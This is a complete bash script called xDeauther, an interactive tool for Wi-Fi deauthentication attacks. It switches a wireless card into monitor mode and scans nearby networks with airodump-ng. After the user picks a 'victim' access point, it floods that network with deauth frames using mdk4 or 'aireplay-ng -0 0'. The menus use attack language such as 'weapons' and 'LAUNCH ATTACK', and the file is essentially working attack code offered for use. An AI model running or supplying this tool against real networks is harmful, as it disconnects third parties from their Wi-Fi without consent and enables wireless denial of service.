#!/bin/bash

#xDeauther v1.0
#Coded by G4L1L30

#warna
H='\033[30m'
R='\033[31m'
G='\033[32m'
B='\033[34m'
P='\033[35m'
C='\033[36m'
Y='\033[33m'
W='\033[97m'
bgH='\033[40m'
bgR='\033[41m'
bgG='\033[42m'
bgB='\033[44m'
bgP='\033[45m'
bgC='\033[46m'
bgY='\033[43m'
bgW='\033[107m'
BOLD='\033[1m'
RST='\033[0m'

trap quit INT

if [[ "$(id -u)" -ne 0 ]]; then
		banner
		echo -e "[${R}${BOLD}!${RST}] This script must run as root!"
		exit
fi

function banner() {
  echo -e """
${R}▒██   ██▒▓█████▄ ▓█████ ▄▄▄       █    ██ ▄▄▄█████▓ ██░ ██ ▓█████  ██▀███
▒▒ █ █ ▒░▒██▀ ██▌▓█   ▀▒████▄     ██  ▓██▒▓  ██▒ ▓▒▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒
░░  █   ░░██   █▌▒███  ▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██▀▀██░▒███   ▓██ ░▄█ ▒
 ░ █ █ ▒ ░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄
▒██▒ ▒██▒░▒████▓ ░▒████▒▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░▓█▒░██▓░▒████▒░██▓ ▒██▒
▒▒ ░ ░▓ ░ ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░
░░   ░▒ ░ ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░░░▒░ ░ ░     ░     ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░
 ░    ░   ░ ░  ░    ░    ░   ▒    ░░░ ░ ░   ░       ░  ░░ ░   ░     ░░   ░
 ░    ░     ░       ░  ░     ░  ░   ░               ░  ░  ░   ░  ░   ░
          ░${RST}                   ${G}${BOLD}~=:by G4L1L30:=~${RST}
                > ${C}\033[4mhttps://github.com/xG4L1L30x/xDeauther${RST} <
"""
}

function dependencies() {
  command -v aircrack-ng > /dev/null 2>&1 || { echo -e "[${R}${BOLD}!${RST}] Dependencies not installed! Please run install.sh first"; exit; }
  command -v mdk4 > /dev/null 2>&1 || { echo -e "[${R}${BOLD}!${RST}] Dependencies not installed! Please run install.sh first"; exit; }
  command -v xterm > /dev/null 2>&1 || { echo -e "[${R}${BOLD}!${RST}] Dependencies not installed! Please run install.sh first"; exit; }
}

function interface() {
  echo -e "-=[ ${Y}${BOLD}SELECT INTERFACE${RST} ]=-\n"
  ip link | grep -E "^[0-9]+" | awk -F':' '{ print $2 }' 1> tmp/iface.txt
  cat tmp/iface.txt | awk '{ print $1 }' | awk '{print "[" "\033[32m\033[1m"NR "\033[0m] " $s}'
  echo ""
  echo -ne "${bgR}${H}xDeauther${RST}:${C}${BOLD}Interface${RST} => "; read slct_interface
  echo ""
  iface=$(sed "$slct_interface!d" tmp/iface.txt | awk '{ print $1 }')
  if [[ $iface == "" ]] && [[ $slct_interface == 0 ]] || [[ $slct_interface =~ [a-zA-Z]+ ]]; then
    echo -e "[${R}${BOLD}!${RST}] Invalid Option! Please select number\n"
    interface
  else
    loading
    check_mode
  fi
}

function check_mode() {
  mode=$(iw $iface info | grep "type" )
  if [[ $mode == *'monitor'* ]]; then
    echo -e "\n[${Y}${BOLD}*${RST}] Interface already in monitor mode"
    sleep 2
    echo -e "[${G}${BOLD}+${RST}] Set ${C}${BOLD}$iface${RST} to main interface"
    sleep 2
    clear
    banner
    weapons
  else
    echo -e "\n[${R}${BOLD}!${RST}] Interface isnt on monitor mode!"
    sleep 2
    loading2
    change_mode
  fi
}

function change_mode() {
  airmon-ng start $iface > /dev/null 2>&1
  chck=$(iw $iface info | grep "type" )
  if [[ $chck == *'monitor'* ]]; then
    echo -e "\n\n[${G}${BOLD}+${RST}] Success change to monitor mode"
    sleep 2
    echo -e "[${G}${BOLD}+${RST}] Set ${C}${BOLD}$iface${RST} to main interface"
    sleep 2
    clear
    banner
    weapons
  elif [[ $chck == *'managed'* ]]; then
    echo -e "\n\n[${R}${BOLD}!${RST}] Interface doesnt supported!"
    sleep 2
    clear
    banner
    interface
  fi
  chckmon=$(ip link | grep -E "^[0-9]+" | awk -F':' '{ print $1 $2 }' | grep "mon")
  if [[ $chckmon == *'mon'* ]]; then
    iface="${iface}mon"
  fi
}

function weapons() {
  echo -e "-=[ ${Y}${BOLD}SELECT WEAPONS${RST} ]=-\n"
  echo -e "[${G}${BOLD}1${RST}] mdk4 [${R}${BOLD}BRUTAL${RST}]"
  echo -e "[${G}${BOLD}2${RST}] aireplay-ng [${Y}${BOLD}NORMAL${RST}]"
  echo -ne "\n${bgR}${H}xDeauther${RST}:${C}${BOLD}Weapons${RST} => "; read slct_weapons
  if [[ $slct_weapons == 1 ]]; then
    echo -e "\n[${G}${BOLD}+${RST}] Set ${R}${BOLD}mdk4${RST} weapon"
    weapon="mdk4"
  elif [[ $slct_weapons == 2 ]]; then
    echo -e "\n[${G}${BOLD}+${RST}] Set ${R}${BOLD}aireplay-ng${RST} to weapon"
    weapon="aireplay-ng"
  else
    echo -e "\n[${R}${BOLD}!${RST}] Invalid Option! Please select number\n"
    weapons
  fi
  sleep 2
  clear
  banner
  target
}

function target() {
  echo -e "-=[ ${Y}${BOLD}EXPLORING TARGET${RST} ]=-\n"
  loading3&
  echo -e "[${Y}${BOLD}*${RST}] Wait at least 5 second and then press CTRL+C to stop"
  xterm -e /bin/bash -l -c "airodump-ng -w tmp/target --output-format csv ${iface}"
  clear
  banner
  echo -e "-=[ ${Y}${BOLD}SELECT TARGET${RST} ]=-\n"
  rmline=$(grep -n "Station MAC" tmp/target-01.csv | awk -F':' '{ print $1 }')
  rmline=$(($rmline - 1))
  sed "${rmline}~1d" tmp/target-01.csv > tmp/target.csv
  sed '1d' tmp/target.csv | cut -d, -f 14,4,1,6 | awk -F',' '{ print $4"," $1"," $2"," $3 }' > tmp/showtarget.csv
  column -s, -t < tmp/showtarget.csv > tmp/target.txt
  awk '{ print "[""\033[32m\033[1m"NR-1"\033[0m]" $s }' tmp/target.txt | sed '1s/0/#/'> tmp/showtarget.txt
  cat tmp/showtarget.txt
  echo -ne "\n${bgR}${H}xDeauther${RST}:${C}${BOLD}Target${RST} => "; read slct_target
  slct_target=$(($slct_target + 1))
  ESSID=$(sed '1d' tmp/target.csv | cut -d, -f 14,4,1,6 | awk -F',' '{ print $4 }' | sed "${slct_target}!d")
  BSSID=$(sed '1d' tmp/target.csv | cut -d, -f 14,4,1,6 | awk -F',' '{ print $1 }' | sed "${slct_target}!d")
  channel=$(sed '1d' tmp/target.csv | cut -d, -f 14,4,1,6 | awk -F',' '{ print $2 }' | sed "${slct_target}!d")
  echo -e "\n[${G}${BOLD}+${RST}] Set${R}${BOLD}${ESSID}${RST} to victim"
  sleep 2
  clear
  banner
  launch_attack
}

function launch_attack() {
  echo -e "-=[ ${R}${BOLD}LAUNCH ATTACK!${RST} ]=-\n"
  echo -e "[ ${G}${BOLD}Victim${RST} ]"
  echo -e "[${Y}${BOLD}*${RST}] Network:${ESSID}"
  echo -e "[${Y}${BOLD}*${RST}] BSSID: ${BSSID}"
  echo -e "[${Y}${BOLD}*${RST}] Channel:${channel}"
  echo -e "\n[ ${G}${BOLD}Tools${RST} ]"
  echo -e "[${Y}${BOLD}*${RST}] Interface: ${iface}"
  echo -e "[${Y}${BOLD}*${RST}] Weapon: ${weapon}"
  echo -e "\nAre you sure to attack this network?[${G}y${RST}/${R}n${RST}]\n"
  echo -ne "${bgR}${H}xDeauther${RST}:${C}${BOLD}Attack${RST} => "; read launch
  if [[ $launch == y ]] || [[ $launch == Y ]]; then
    echo -e "\n[${Y}${BOLD}*${RST}] ${R}${BOLD}LAUNCH ATTACKK!!..${RST}"
    sleep 2
    clear
    banner
    echo -e "-=[ ${R}${BOLD}ATTACKING${RST} ]=-\n"
    echo -e "[${Y}${BOLD}*${RST}] Attacking${R}${ESSID}...${RST}"
    echo -e "[${Y}${BOLD}*${RST}] Press CTRL+C to stop attack"
    case $slct_weapons in
      1 )
        xterm -fg "#FF0000" -T "Deauth${ESSID} with mdk4" -e /bin/bash -l -c "mdk4 ${iface} d -B ${BSSID} -c ${channel}"
        ;;
      2 )
        xterm -T "Wait... Set Channel" -e /bin/bash -l -c "timeout 2 airodump-ng -c ${channel} ${iface}"
        sleep 1
        xterm -fg "#FF0000" -T "Deauth${ESSID} with aireplay-ng" -e /bin/bash -l -c "aireplay-ng -0 0 -a ${BSSID} --ignore-negative-one ${iface}"
    esac
    echo -e "\n[${Y}${BOLD}*${RST}] Do you want to exit?[${G}y${RST}/${R}n${RST}]"
    echo -ne "\n${bgR}${H}xDeauther${RST}:${C}${BOLD}eXit?${RST} => "; read close
  elif [[ $launch == n ]] || [[ $launch == N ]]; then
    sleep 2
    clear
    banner
    weapons
  fi
  if [[ $close == y ]] || [[ $close == Y ]]; then
    quit
  elif [[ $close == n  ]] || [[ $close == N ]]; then
    clear
    banner
    weapons
  fi
}

function loading3() {
  for (( i = 0; i <= 10 ; i++ )); do
    echo -ne "[${C}―${RST}] Exploring for target...\r"
    sleep 0.1
    echo -ne "[\]\r"
    sleep 0.1
    echo -ne "[${C}￨${RST}]\r"
    sleep 0.1
    echo -ne "[${C}/${RST}]\r"
    sleep 0.1
  done
}

function loading2() {
  for (( i = 0; i <= 8 ; i++ )); do
    echo -ne "[${C}―${RST}] Change interface mode to monitor...\r"
    sleep 0.1
    echo -ne "[\]\r"
    sleep 0.1
    echo -ne "[${C}￨${RST}]\r"
    sleep 0.1
    echo -ne "[${C}/${RST}]\r"
    sleep 0.1
  done
}

function loading() {
  for (( i = 0; i <= 8 ; i++ )); do
    echo -ne "[${C}―${RST}] Check interface mode...\r"
    sleep 0.1
    echo -ne "[\]\r"
    sleep 0.1
    echo -ne "[${C}￨${RST}]\r"
    sleep 0.1
    echo -ne "[${C}/${RST}]\r"
    sleep 0.1
  done
}

function quit() {
  echo -e "\n\n[${R}${BOLD}-${RST}] Cleaning temporary file..."
  rm tmp/*
  if [[ $( iw $iface info | grep "type" ) == *'monitor'* ]]; then
    sleep 2
    echo -e "[${R}${BOLD}-${RST}] Set interface to managed mode..."
    airmon-ng stop $iface > /dev/null 2>&1
  fi
  sleep 2
  echo -e "[${Y}${BOLD}*${RST}] Thx for using my script :)"
  exit
}

clear
banner
dependencies
interface
